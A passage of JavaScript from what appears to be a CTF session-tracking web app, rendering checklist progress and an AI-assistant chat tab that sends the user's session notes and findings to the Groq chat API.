      <div class="phase-body" id="pb-${ph.id}"><div class="phase-body-inner">${rows}${(!clSearch&&clFilter!=='done')?buildParserBlock(ph.id):''}</div></div>
    </div>`;
  }).join('');

  // Type-specific sub-checklist
  const typeKeys=Object.keys(TYPE_CHECKLISTS).filter(k=>TYPE_CHECKLISTS[k]);
  const activeType=clTypeFilter||(t.type&&TYPE_CHECKLISTS[t.type]?t.type:null);
  const typePills=`<div class="type-checklist-header">
    <span class="type-cl-label">Session-Type Checklist</span>
    <div class="type-pills">
      <button class="type-pill${!activeType?' active':''}" onclick="clTypeFilter=null;renderTab()">None</button>
      ${typeKeys.map(k=>`<button class="type-pill${activeType===k?' active':''}" style="${activeType===k?`background:${TYPE_CHECKLISTS[k].color}1a;color:${TYPE_CHECKLISTS[k].color};border-color:${TYPE_CHECKLISTS[k].color}40`:''}" onclick="clTypeFilter='${k}';renderTab()">${TYPE_CHECKLISTS[k].name}</button>`).join('')}
    </div>
  </div>`;
  let typeSection='';
  if(activeType&&TYPE_CHECKLISTS[activeType]){
    const tc=TYPE_CHECKLISTS[activeType];
    const tItems=tc.items.filter(it=>{
      const ms=!clSearch||it.text.toLowerCase().includes(clSearch.toLowerCase())||(it.hint||'').toLowerCase().includes(clSearch.toLowerCase());
      const mf=clFilter==='all'?true:clFilter==='done'?!!(t.typeChecks||{})[it.id]:!(t.typeChecks||{})[it.id];
      return ms&&mf;
    });
    const tDone=tc.items.filter(it=>(t.typeChecks||{})[it.id]).length;
    const tRows=tItems.map(it=>buildCheckItem(it,t.typeChecks,t.checkNotes,true)).join('');
    typeSection=`<div class="phase-block type-phase-block">
      <div class="phase-toggle open" id="pt-type" onclick="togglePhase('type')">
        <div class="phase-toggle-icon" style="background:${tc.color}1a;color:${tc.color}">${IC.search}</div>
        <span class="ph-nm">${tc.name} Checklist</span>
        <span class="ph-ct" style="color:${tDone===tc.items.length?'var(--green)':'var(--t3)'}">${tDone}/${tc.items.length}</span>
        <span class="ph-chev">${IC.chevron}</span>
      </div>
      <div class="phase-body open" id="pb-type"><div class="phase-body-inner">${tRows||'<div class="fi-empty">No items match your filter.</div>'}</div></div>
    </div>`;
  }

  return`<div class="cl-wrap">
    <div style="display:flex;align-items:center;gap:12px;margin-bottom:0;padding:10px 14px;background:var(--surface);border:1px solid var(--border);border-radius:var(--r2)">
      <span style="font-size:13px;font-weight:600;color:var(--t1)">Session Progress</span>
      <div style="flex:1;height:6px;background:var(--border);border-radius:6px;overflow:hidden"><div style="height:100%;background:var(--accent);width:${phasePct}%;border-radius:6px;transition:width .5s var(--snap)"></div></div>
      <span style="font-size:13px;font-weight:700;color:var(--accent);font-family:var(--mono)">${phasePct}%</span>
    </div>
    ${bar}${phases}${typePills}${typeSection}</div>`;
}

/* ═══════════════ AI ASSISTANT ══════════════ */
const AI_KEY_STORE=K+'_ai_key';
const AI_MODEL='llama-3.3-70b-versatile';
const AI_API='https://api.groq.com/openai/v1/chat/completions';
let aiMessages=[]; // per-session chat history
let aiLoading=false;

function getAiKey(){return localStorage.getItem(AI_KEY_STORE)||'';}
function saveAiKey(k){if(k)localStorage.setItem(AI_KEY_STORE,k);else localStorage.removeItem(AI_KEY_STORE);}

function buildAiContext(t){
  if(!t)return'No session loaded.';
  const done=[], pending=[];
  PHASES.forEach(ph=>{
    ph.items.forEach(it=>{
      if((t.checks||{})[it.id])done.push(`[DONE] ${ph.name}: ${it.text}`);
      else pending.push(`[TODO] ${ph.name}: ${it.text}`);
    });
  });
  const notes=(t.notes||[]).map(n=>`- ${n.text||''}`).join('\n')||'None';
  const findings=(t.findings||[]).map(f=>`[${f.severity||'?'}] ${f.title||''}: ${f.body||''}`).join('\n')||'None';
  const cmds=(t.commands||[]).map(c=>`$ ${c.cmd||''}`).join('\n')||'None';
  return `SESSION CONTEXT
Name: ${t.name||'Unknown'}
Platform: ${t.platform||'Unknown'}
Type: ${t.type||'Unknown'}
Difficulty: ${t.difficulty||'Unknown'}
Status: ${t.completed?'Completed':'In Progress'}
Time spent: ${Math.round((t.elapsed||0)/60)} minutes

CHECKLIST PROGRESS (${done.length}/${done.length+pending.length} done):
${done.slice(0,10).join('\n')}
${pending.slice(0,10).join('\n')}

NOTES:
${notes.slice(0,800)}

FINDINGS:
${findings.slice(0,600)}

COMMANDS USED:
${cmds.slice(0,400)}`;
}

function buildAiTab(t){
  const key=getAiKey();
  const hasKey=!!key;

  /* ── key section ── */
  const keyHtml=`<div class="ai-key-section">
    <span class="ai-key-label">GROQ KEY</span>
    <div class="ai-key-input-wrap">
      <input type="password" id="ai-key-input" placeholder="sk-..." value="${esc(key)}" autocomplete="off"
        onkeydown="if(event.key==='Enter')aiSaveKey()">
      <div class="ai-key-status">
        <div class="ai-key-dot ${hasKey?'ok':'no'}"></div>
        <span style="color:var(--t4);font-size:10px;font-family:var(--mono)">${hasKey?'saved':'no key'}</span>
      </div>
    </div>
    <button class="btn btn-sm btn-ghost" onclick="aiSaveKey()" style="flex-shrink:0">Save</button>
    ${hasKey?`<button class="btn btn-sm btn-danger" onclick="aiClearKey()" style="flex-shrink:0">Clear</button>`:''}
    <a href="https://console.groq.com/keys" target="_blank" rel="noopener"
       style="font-size:11px;color:var(--t4);font-family:var(--mono);white-space:nowrap;flex-shrink:0">
       Get free key ↗</a>
  </div>`;

  /* ── messages ── */
  const botIcon=`<svg viewBox="0 0 24 24"><path d="M12 2a2 2 0 0 1 2 2c0 .74-.4 1.39-1 1.73V7h1a7 7 0 0 1 7 7h1a1 1 0 0 1 1 1v3a1 1 0 0 1-1 1h-1v1a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-1H2a1 1 0 0 1-1-1v-3a1 1 0 0 1 1-1h1a7 7 0 0 1 7-7h1V5.73c-.6-.34-1-.99-1-1.73a2 2 0 0 1 2-2z"/></svg>`;
  const sendIcon=`<svg viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>`;

  const suggestions=['What should I focus on next?','Suggest exploits for this type','Summarize my progress','Any red flags in my findings?','How do I escalate privileges?'];

  let chatHtml;
  if(!aiMessages.length){
    const suggHtml=suggestions.map(s=>`<button class="ai-sugg-btn" onclick="aiSend(${JSON.stringify(s)})">${s}</button>`).join('');
    chatHtml=`<div class="ai-empty-state">
      <div class="ai-empty-icon">${botIcon}</div>
      <div class="ai-empty-title">AI Assistant</div>
      <div class="ai-empty-sub">Powered by Groq · ${AI_MODEL}<br>Ask anything about your current session.</div>
      <div class="ai-suggestions">${suggHtml}</div>
    </div>`;
  }else{
    const bubbles=aiMessages.map(m=>{
      if(m.role==='user'){
        return`<div class="chat-msg user">
          <div class="chat-avatar user">U</div>
          <div class="chat-bubble user">${esc(m.content)}</div>
        </div>`;
      }
      return`<div class="chat-msg ai">
        <div class="chat-avatar ai">${botIcon}</div>
        <div class="chat-bubble ai">${markdownToHtml(m.content)}</div>
      </div>`;
    }).join('');
    const loadingBubble=aiLoading?`<div class="chat-msg ai">
      <div class="chat-avatar ai">${botIcon}</div>
      <div class="chat-bubble loading"><div class="loading-dots"><span></span><span></span><span></span></div></div>
    </div>`:'';
    chatHtml=bubbles+loadingBubble;
  }

  /* ── input ── */
  const inputHtml=`<div class="ai-input-section">
    <div class="chat-input-row">
      <input type="text" id="ai-user-input" placeholder="Ask about your session..."
        onkeydown="if(event.key==='Enter'&&!event.shiftKey){aiSendInput();event.preventDefault()}">
      <button class="chat-send-btn" onclick="aiSendInput()" ${aiLoading?'disabled':''} title="Send">
        ${sendIcon}
      </button>
    </div>
    ${aiMessages.length?`<div style="display:flex;justify-content:flex-end;margin-top:6px">
      <button class="btn btn-xs btn-ghost" onclick="aiMessages=[];renderTab()">Clear chat</button>
    </div>`:''}
  </div>`;

  return`<div class="ai-outer">
    ${keyHtml}
    <div class="ai-chat-area" id="ai-msgs">${chatHtml}</div>
    ${inputHtml}
  </div>`;
}

function aiSaveKey(){
  const k=E('ai-key-input')?.value.trim();
  saveAiKey(k);
  toast(k?'API key saved':'API key cleared');
  renderTab();
}
function aiClearKey(){saveAiKey('');toast('API key cleared');renderTab();}

function aiSendInput(){
  const input=E('ai-user-input');
  if(!input)return;
  const msg=input.value.trim();
  if(!msg)return;
  input.value='';
  aiSend(msg);
}

async function aiSend(userMsg){
  const key=getAiKey();
  if(!key){toast('Add a Groq API key first');return;}
  if(aiLoading)return;

  const sendingForId=activeId; // capture to guard stale renders
  const t=targets.find(x=>x.id===activeId);
  aiMessages.push({role:'user',content:userMsg});
  aiLoading=true;
  renderTab();

  const systemPrompt=`You are an AI assistant embedded in HackLog, a personal CTF tracking tool. The user is a CTF player/hacker. Help them with their current session using the context below. Be concise, actionable, and technical. Format your replies in markdown.

${buildAiContext(t)}`;

  const body={
    model:AI_MODEL,
    messages:[
      {role:'system',content:systemPrompt},
      ...aiMessages.map(m=>({role:m.role,content:m.content}))
    ],
    max_tokens:800,
    temperature:0.7
  };

  try{
    const res=await fetch(AI_API,{
      method:'POST',
      headers:{'Content-Type':'application/json','Authorization':'Bearer '+key},
      body:JSON.stringify(body)
    });
    if(!res.ok){
      const err=await res.json().catch(()=>({}));
      throw new Error(err?.error?.message||`HTTP ${res.status}`);
    }
    const data=await res.json();
    const reply=data.choices?.[0]?.message?.content||'No response';
    aiMessages.push({role:'assistant',content:reply});
  }catch(err){
    aiMessages.push({role:'assistant',content:`**Error:** ${err.message}\n\nCheck your API key at [console.groq.com/keys](https://console.groq.com/keys).`});
  }finally{
    aiLoading=false;
    if(activeId===sendingForId&&activeTab==='ai')renderTab();
    setTimeout(()=>{const el=E('ai-msgs');if(el)el.scrollTop=el.scrollHeight;},50);
  }
}

/* ═══════════════ INIT ════════════════════ */
loadTheme();
load();
loadBlogs();
loadSheets();
loadWriteups();
renderSidebar();
updateNavXP();
startTimerLoop();
showProfile();
renderProfile();
